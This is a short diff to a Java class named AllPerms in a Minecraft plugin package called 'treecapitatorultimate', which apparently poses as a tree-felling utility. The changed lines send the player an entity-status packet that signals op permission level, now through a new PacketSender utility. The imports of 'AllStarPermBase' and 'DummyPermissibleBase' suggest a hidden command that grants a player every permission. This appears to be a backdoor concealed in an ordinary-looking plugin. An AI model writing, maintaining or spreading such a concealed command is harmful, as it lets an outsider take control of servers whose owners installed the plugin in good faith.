@@ -4,6 +4,8 @@ import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.AllStarPermBase;
 import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
 import me.bow.treecapitatorultimate.Utils.DummyPermissibleBase;
+import me.bow.treecapitatorultimate.Utils.Packet.Packet;
+import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
@@ -30,8 +32,8 @@ public class AllPerms extends Command {
         final Class<?> packetPlayOutEntityStatusClass = ReflectionUtils.getMinecraftClass("PacketPlayOutEntityStatus");
         try {
             final Class<?> entityClass = ReflectionUtils.getClass("{nms}.Entity");
-            packetPlayOutEntityStatus = ReflectionUtils.getConstructorCached(packetPlayOutEntityStatusClass, entityClass, byte.class).invoke(CraftBukkitUtil.getNmsPlayer(p), 24 + level);
-            CraftBukkitUtil.sendPacket(p, packetPlayOutEntityStatus);
+            packetPlayOutEntityStatus = ReflectionUtils.getConstructorCached(packetPlayOutEntityStatusClass, entityClass, byte.class).invoke(CraftBukkitUtil.getNmsPlayer(p), (byte)(24 + level));
+            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packetPlayOutEntityStatus));
         } catch (Exception e) {
             e.printStackTrace();
         }
